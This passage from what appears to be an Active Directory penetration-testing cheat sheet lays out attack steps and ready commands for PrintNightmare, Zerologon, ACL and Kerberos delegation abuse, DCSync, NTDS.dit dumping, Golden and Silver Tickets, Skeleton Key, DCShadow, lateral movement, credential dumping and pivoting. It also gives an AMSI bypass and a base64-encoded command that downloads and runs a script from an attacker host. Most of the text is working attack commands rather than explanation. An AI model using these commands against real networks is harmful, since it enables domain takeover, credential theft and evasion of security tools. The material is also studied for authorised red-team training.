6.NTLMv2 hash automatically sent
7.Responder captures the hash

--------------------------------------------------------------------------

(Create malicious files)

 # .scf file (desktop icon file)
cat > @exploit.scf << EOF
[Shell]
Command=2
IconFile=\\[ATTACKER-IP]\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# .url file
cat > @exploit.url << EOF
[InternetShortcut]
URL=file://[ATTACKER-IP]/share
EOF

----------------------------------------------------------------------------

(Place in share)

# Find shares with write access via CrackMapExec
crackmapexec smb [TARGET] -u [user] -p [pass] --shares

# Automate with NetExec slinky (create and place at once)
netexec smb [TARGET-IPs] -u [user] -p [pass] -M slinky -o SERVER=[ATTACKER-IP] NAME=@exploit

---------------------------------------------------------------

(proxychains version)

# Find shares with write access via CrackMapExec
proxychains crackmapexec smb [TARGET] -u [user] -p [pass] --shares
# Automate with NetExec slinky (create and place at once)
proxychains netexec smb [TARGET-IPs] -u [user] -p [pass] -M slinky -o SERVER=[ATTACKER-IP] NAME=@exploit

---------------------------------------------------------------------------------

(Wait with Responder)

sudo responder -I eth0 -v
```

### [3-9 : PrintNightmare (CVE-2021-34527)]

A vulnerability in the Windows Print Spooler service that allows loading a malicious DLL remotely to obtain SYSTEM privileges

**Requirements:**

```bash
1.Must have domain user credentials
2.Target machine must be unpatched (before July 2021)
3.Print Spooler service must be running
```

**Attack Flow + Tools & Commands:**

```bash
1.Find vulnerable machines (check if Print Spooler is running)
2.Prepare malicious DLL file (reverse shell or add local admin account)
3.Open SMB share on Kali to serve the DLL
4.Run exploit → target loads DLL from attacker SMB
5.DLL executes with SYSTEM privileges
6.Reverse shell or new admin account created

------------------------------------------------------------------

# Check vulnerability
crackmapexec smb [IP] -u [user] -p [pass] -M printnightmare

# Use cube0x0 exploit
# https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py domain.local/[user]:[pass]@[IP] '\\[ATTACKER-IP]\share\evil.dll'

# Impacket-based
python3 printnightmare.py domain.local/[user]:[pass]@[IP] '\\[ATTACKER-IP]\share\evil.dll'

---------------------------------------------------------------

(proxychains version)

# Check vulnerability
proxychains crackmapexec smb [IP] -u [user] -p [pass] -M printnightmare
# cube0x0 exploit
proxychains python3 CVE-2021-1675.py domain.local/[user]:[pass]@[IP] '\\[ATTACKER-IP]\share\evil.dll'
# Impacket-based
proxychains python3 printnightmare.py domain.local/[user]:[pass]@[IP] '\\[ATTACKER-IP]\share\evil.dll'
```

### [3-10 : Zerologon (CVE-2020-1472)]

A cryptographic vulnerability in the Netlogon protocol that allows resetting the DC machine account password to blank without authentication

(Immediate domain takeover possible)

**How it works:**

```bash
1. Attacker fills the IV of a Netlogon packet with 0 and sends it to DC
2. Due to AES-CFB8 characteristics, if IV is 0, the encryption result is also 0 about 1 in 256 times
3. Repeat this an average of 256 times
4. When encryption result is 0, DC decrypts the password as 0 (blank)
5. DC accepts authentication with blank password
6. DC machine account password reset to blank
7. Attacker logs into DC with empty password → domain takeover
```

**Requirements:**

```bash
1.Network access to DC
#ping [DC-IP] works
#port 445 is open
2.Unpatched DC (before August 2020)
3.Caution: can break the DC in real environments, use carefully
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Confirm DC IP
2.Test Zerologon vulnerability (zerologon_tester.py)
3.If vulnerable → reset DC machine account password to blank
4.Authenticate to DC machine account with blank password
5.Dump all hashes with secretsdump.py
6.Domain takeover with DA hash
7.Must restore DC original password (DC will break if not done)

-----------------------------------------------------------------------

(Attack execution)

# Check vulnerability
python3 zerologon_tester.py [DC-NETBIOS-NAME] [DC-IP]

# Exploit (reset DC password to blank)
python3 cve-2020-1472-exploit.py [DC-NETBIOS-NAME] [DC-IP]

# Then dump hashes with secretsdump.py
secretsdump.py -no-pass -just-dc [domain]/[DC-NETBIOS-NAME]\$@[DC-IP]

# Restore (must restore original password!)
python3 restorepassword.py [domain]/[DC-NETBIOS-NAME]@[DC-IP] -target-ip [DC-IP] -hexpass [original hex password]

---------------------------------------------------------------

(proxychains version)

# Check vulnerability
proxychains python3 zerologon_tester.py [DC-NETBIOS-NAME] [DC-IP]
# Exploit (reset DC password to blank)
proxychains python3 cve-2020-1472-exploit.py [DC-NETBIOS-NAME] [DC-IP]
# Dump hashes with secretsdump.py
proxychains secretsdump.py -no-pass -just-dc [domain]/[DC-NETBIOS-NAME]\$@[DC-IP]
# Restore (must restore original password!)
proxychains python3 restorepassword.py [domain]/[DC-NETBIOS-NAME]@[DC-IP] -target-ip [DC-IP] -hexpass [original hex password]
```

### [3-11 : ACL / ACE Abuse]

AD objects (users, groups, computers) have access control lists (ACLs), and misconfigured permissions such as GenericWrite, WriteDACL, WriteOwner can be abused to take over other accounts or escalate privileges

**Key dangerous permissions:**

```bash
1.GenericAll - change target account password, set SPN
2.GenericWrite - set SPN (Kerberoasting), modify logon scripts
3.WriteDACL - grant DCSync rights to own account
4.WriteOwner - change owner then obtain permissions
5.ForceChangePassword - force password change
```

**Requirements:**

```bash
1.Must have domain user credentials
2.Must be able to enumerate misconfigured ACLs with BloodHound or PowerView
3.Own account must have dangerous permissions on the target object
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Find misconfigured ACLs with BloodHound
2.Confirm own account has GenericAll/GenericWrite etc. on target
3.Choose attack method based on permission:
4.GenericWrite → set SPN → Kerberoasting
5.WriteDACL → grant DCSync rights to own account → DCSync
6.ForceChangePassword → force change target password
7.WriteOwner → change owner → obtain GenericAll
8.Proceed with further attacks using elevated privileges

-------------------------------------------------------------------

(Discovery and attack)

# Visually confirm in BloodHound

# Check ACL of specific account with PowerView
Get-ObjectAcl -Identity [user] -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL"}

# Set SPN with GenericWrite → Kerberoasting
Set-DomainObject -Identity [target-user] -Set @{serviceprincipalname='fake/spn'}
# Then run Kerberoasting

# Abuse ForceChangePassword (PowerView)
$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity [target-user] -AccountPassword $SecPassword -Verbose
```

### [3-12 : Kerberos Delegation Abuse]

Delegation is a feature that allows a service to access other services on behalf of a user

Misconfigured Delegation can be abused for privilege escalation

**Requirements:**

```bash
1.Must have domain user credentials
2.Unconstrained: must have local admin access to the machine with Delegation configured
3.RBCD: must have GenericWrite or higher on the target computer object
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow 1 - Unconstrained)

1.Find machines with Unconstrained Delegation (BloodHound or PowerView)
2.Obtain local admin access to that machine
3.Wait for TGT capture with Rubeus monitor
4.Use PrinterBug/SpoolSample to force DC to connect to that machine
5.DC's TGT gets cached in memory
6.Extract TGT → connect to DCSync or Golden Ticket

(Attack 1 - Unconstrained Delegation)

# Find targets (can delegate to all services = most dangerous)
Get-DomainComputer -Unconstrained

# Force DC to connect (PrinterBug/SpoolSample)
# → DC's TGT cached in memory → steal it
.\Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe [DC-IP] [ATTACKER-IP]

--------------------------------------------------------------------------

(Attack Flow 2 - RBCD)

1.Confirm own account has GenericWrite on target computer
2.Create new machine account or obtain existing machine account hash
3.Modify msDS-AllowedToActOnBehalfOf attribute on target computer
4.Request Administrator ticket with Rubeus s4u
5.Admin access to target computer

(Attack 2 - Resource-Based Constrained Delegation (RBCD))

# Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute
# PowerView + Impacket
Set-DomainObject -Identity [target-computer] -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Rubeus.exe s4u /user:[our-machine$] /rc4:[machine-hash] /impersonateuser:administrator /msdsspn:cifs/[target] /ptt
```

### [Phase 4 : Domain Compromise]

In Phase 4, the goal is to fully take over the DC after obtaining Domain Admin or equivalent privileges

### [4-1 : DCSync Attack]

The DCSync Attack is a technique where the attacker acts as a fake DC and requests data replication from the real DC

This allows extracting all account hashes (including NTLM and Kerberos keys) from the domain without physically accessing the DC

**Requirements:**

```bash
1.Must have an account with DS-Replication-Get-Changes + DS-Replication-Get-Changes-All permissions
2.Usually Domain Admin, Enterprise Admin, Domain Controllers groups have these permissions
3.Can search for non-standard accounts with BloodHound "Find Principals with DCSync Rights" query
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Obtain account with DA privileges or DCSync permissions
2.Pretend to be a fake DC and send replication request to real DC (DRSUAPI GetNCChanges)
3.DC treats it as a normal replication request and returns hashes
4.Obtain NTLM hashes + Kerberos keys for all accounts
5.krbtgt hash → create Golden Ticket
6.Administrator hash → Pass-the-Hash

--------------------------------------------------------------------

(Attack execution)

# Mimikatz (Windows, DA privileges)
1.Run mimikatz.exe
2.privilege::debug (privilege escalation)

3-1.lsadump::dcsync /user:Administrator
→ dump only Administrator account hash

3-2.lsadump::dcsync /domain:domain.local /all /csv
→ dump all domain account hashes + output in CSV format

# secretsdump.py (Kali, with credentials)
secretsdump.py domain.local/[DA-user]:[pass]@[DC-IP] -just-dc-ntlm

# secretsdump.py (with hash)
secretsdump.py -hashes :[NTLM-hash] domain.local/[user]@[DC-IP] -just-dc-ntlm

---------------------------------------------------------------

(proxychains version)

# secretsdump.py (with credentials)
proxychains secretsdump.py domain.local/[DA-user]:[pass]@[DC-IP] -just-dc-ntlm
# secretsdump.py (with hash)
proxychains secretsdump.py -hashes :[NTLM-hash] domain.local/[user]@[DC-IP] -just-dc-ntlm
```

### [4-2 : NTDS.dit Dump]

An attack that directly extracts the DC's Active Directory database file (NTDS.dit) to obtain all hashes

※The SYSTEM registry hive (contains decryption key) is also required

**Requirements:**

```bash
1.Must have direct access to DC (local or remote)
2.DA privileges or Backup Operators privileges
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

Access DC with DA privileges (Evil-WinRM, psexec etc.)
  → Create Volume Shadow Copy (to copy files in use)
  → Copy NTDS.dit + SYSTEM hive from Shadow Copy
  → Transfer files to Kali
  → Extract hashes offline with secretsdump.py
  → Obtain all domain account hashes

-----------------------------------------------------------------

(Attack execution)

# Use Volume Shadow Copy (Windows)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
reg save HKLM\SYSTEM C:\SYSTEM

# Extract from Kali
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# impacket ntdsutil
ntdsutil.py [user]@[DC-IP] -hashes :[hash]

---------------------------------------------------------------

(proxychains version)

# Access DC (via pivot)
proxychains evil-winrm -i [DC-IP] -u [user] -p [pass]
# Retrieve NTDS.dit file
proxychains scp [user]@[DC-IP]:C:/ntds.dit ./
# Retrieve SYSTEM hive file
proxychains scp [user]@[DC-IP]:C:/SYSTEM ./
# impacket ntdsutil
proxychains ntdsutil.py [user]@[DC-IP] -hashes :[hash]
```

### [4-3 : Golden Ticket Attack]

An attack that forges a TGT (Ticket Granting Ticket) using the krbtgt account's NTLM hash

The forged TGT can access anywhere in the domain, can be set to expire in 10 years, and remains valid even after password changes (must reset krbtgt password twice to invalidate)

**Requirements:**

```bash
1.Must have krbtgt account's NTLM hash (obtained via DCSync or NTDS.dit)
2.Domain SID required
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Obtain krbtgt hash via DCSync or NTDS.dit
2.Confirm domain SID (whoami /user or Get-DomainSID)
3.Forge TGT with Mimikatz / Rubeus
4.(Any username is fine, even non-existent ones)
5.Inject forged ticket into memory (/ptt)
6.Can access all services in the domain
7.Remains valid until krbtgt is reset twice even after password changes

--------------------------------------------------------------------------------

(Required information collection)

# Confirm domain SID
whoami /user  # S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-[RID]
# or
Get-DomainSID  # PowerView

# krbtgt hash (DCSync)
secretsdump.py domain.local/[DA-user]:[pass]@[DC-IP] -just-dc-user krbtgt

---------------------------------------------------------------

(proxychains version)

# Collect krbtgt hash (DCSync)
proxychains secretsdump.py domain.local/[DA-user]:[pass]@[DC-IP] -just-dc-user krbtgt

------------------------------------------------------------------------------------

(Create and use Golden Ticket)

# Mimikatz
1.Run mimikatz.exe
2.kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXX /krbtgt:[krbtgt-hash] /ptt
※/user:Administrator is not required, /user:FakeAdmin → non-existent accounts are also fine
※Because it passes as long as the signature matches

# Rubeus
.\Rubeus.exe golden /rc4:[krbtgt-hash] /domain:domain.local /sid:S-1-5-21-XXXXXXX /user:FakeAdmin /ptt

# Verify access after injection
dir \\DC\C$
psexec.exe \\DC cmd.exe
```

### [4-4 : Silver Ticket Attack]

An attack that forges a TGS (Ticket Granting Service) ticket using a service account's hash

Unlike Golden Ticket, it does not communicate with the DC making detection harder, but access is limited to specific services only

**Requirements:**

```bash
1.Must have service account NTLM hash
2.Need SPN information for the target service
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Obtain service account hash (via Kerberoasting crack or Mimikatz)
2.Confirm target service SPN (e.g. cifs/fileserver.domain.local)
3.Forge TGS with Mimikatz (created locally without communicating with DC)
4.Inject forged ticket (/ptt)
5.Can only access that service (narrower scope than Golden but harder to detect)

---------------------------------------------------------------------------

(Attack execution)

# Mimikatz
1.Run mimikatz.exe
2.kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXX /target:[service-host] /service:cifs /rc4:[service-account-hash] /ptt

# Verify access
dir \\[target]\C$
```

### [4-5 : Skeleton Key Attack]

An attack that injects a master password (a password that can log into any account) into the DC's LSASS process, making it possible to authenticate to all accounts with the password "Mimikatz" (existing passwords are also preserved)

※Disappears on reboot.

**Requirements:**

```bash
1.Must be able to access DC with DA privileges
2.Must be able to bypass AV/EDR
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Access DC with DA privileges
2.Upload Mimikatz to DC
3.Run privilege::debug → misc::skeleton
4.Inject master password ("Mimikatz") into LSASS
5.After this, all domain accounts can authenticate with password "Mimikatz"
6.Existing passwords are still valid (coexist)
7.Disappears on reboot (not permanent)

------------------------------------------------------------------

(Attack execution)

# Mimikatz (run on DC)
1.Run mimikatz.exe
2.privilege::debug (privilege escalation)
3.misc::skeleton (Skeleton Key injection)

# After this, any account can authenticate with password "Mimikatz"
net use \\DC\C$ /user:Administrator Mimikatz
```

### [4-6 : DCShadow]

An advanced attack that registers a fake DC in AD and force-pushes malicious changes (new accounts, permission changes etc.) into the real AD

※Can bypass existing audit logs

**Requirements:**

```bash
1.Must have DA privileges
2.Need two Mimikatz instances
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Access machine with DA privileges
2.Mimikatz instance 1: register fake DC (lsadump::dcshadow)
3.Mimikatz instance 2: prepare changes to push (e.g. grant DA privileges to specific user, create backdoor account etc.)
4.Force replicate changes into real AD with /push
5.Appears as normal DC replication in existing audit logs
6.Extremely difficult to detect

--------------------------------------------------------------------------

(Attack execution)

Terminal 1 - (Start fake DC)
1. Run mimikatz.exe
2. !+
3. !processtoken
4. lsadump::dcshadow
→ Register fake DC and wait

Terminal 2 - (Push changes)
1. Run mimikatz.exe
2. lsadump::dcshadow /object:targetuser /attribute:description /value:"hacked"
→ Prepare changes
3. lsadump::dcshadow /push
→ Force replicate into AD

-------------------------------------------------------------------------------

(Verification)

# Verify with PowerShell
Get-ADUser targetuser -Properties description
→ Check if description changed to "hacked"

# Verify DA group members
Get-ADGroupMember "Domain Admins"
→ Check if targetuser was added
```

### [Phase 5 : Post-Exploitation & Persistence]

In the final Phase 5, the goal is to maintain access after taking over the DC and move to necessary systems

### [5-1 : Lateral Movement]

```bash
# psexec.py - remote command via SMB
psexec.py domain.local/Administrator:[pass]@[IP]
psexec.py -hashes :[hash] domain.local/Administrator@[IP]

# wmiexec.py - remote command via WMI (quieter)
wmiexec.py domain.local/Administrator:[pass]@[IP]

# smbexec.py - execution via SMB
smbexec.py domain.local/Administrator:[pass]@[IP]

# Evil-WinRM - PowerShell remote (WinRM, port 5985)
evil-winrm -i [IP] -u Administrator -p [pass]
evil-winrm -i [IP] -u Administrator -H [hash]

# RDP
xfreerdp /v:[IP] /u:Administrator /p:[pass] +clipboard /dynamic-resolution

---------------------------------------------------------------

(proxychains version)

# psexec.py - remote command via SMB
proxychains psexec.py domain.local/Administrator:[pass]@[IP]
proxychains psexec.py -hashes :[hash] domain.local/Administrator@[IP]
# wmiexec.py - remote command via WMI (quieter)
proxychains wmiexec.py domain.local/Administrator:[pass]@[IP]
# smbexec.py - execution via SMB
proxychains smbexec.py domain.local/Administrator:[pass]@[IP]
# Evil-WinRM - PowerShell remote (WinRM, port 5985)
proxychains evil-winrm -i [IP] -u Administrator -p [pass]
proxychains evil-winrm -i [IP] -u Administrator -H [hash]
# RDP
proxychains xfreerdp /v:[IP] /u:Administrator /p:[pass] +clipboard /dynamic-resolution
```

### [5-2 : Credential Dumping]

```bash
# Mimikatz - LSASS memory dump
1. Run mimikatz.exe
2. privilege::debug
3-1. sekurlsa::logonpasswords → plaintext passwords + hashes
3-2. lsadump::sam → SAM database local account hashes
3-3. lsadump::lsa /patch → LSA Secrets cached credentials

# CrackMapExec
crackmapexec smb [IP] -u [user] -p [pass] --lsa   → LSA Secrets dump
crackmapexec smb [IP] -u [user] -p [pass] --ntds  → DC NTDS.dit dump

# secretsdump.py
secretsdump.py domain.local/[user]:[pass]@[IP] → dump SAM + LSA + NTDS all at once

---------------------------------------------------------------

(proxychains version)

# CrackMapExec - LSA Secrets dump
proxychains crackmapexec smb [IP] -u [user] -p [pass] --lsa
# CrackMapExec - DC NTDS.dit dump
proxychains crackmapexec smb [IP] -u [user] -p [pass] --ntds
# secretsdump.py - dump SAM + LSA + NTDS all at once
proxychains secretsdump.py domain.local/[user]:[pass]@[IP]
```

### [5-3 : Network Pivoting]

```bash
# proxychains configuration
# Add to /etc/proxychains.conf:
# socks5 127.0.0.1 1080

# SSH tunnel (SOCKS5 proxy)
ssh -D 1080 -f -N user@[jump-host]

# Chisel tunnel
# Server (attacker)
chisel server --port 8080 --reverse

# Client (victim)
chisel client [ATTACKER-IP]:8080 R:socks

# Then access internal network via proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
```

### [5-4 : AV / EDR Bypass Basics]

```bash
# AMSI Bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution Policy bypass
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1

# Base64 encoding
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://[IP]/script.ps1')"))
powershell -enc $enc
```
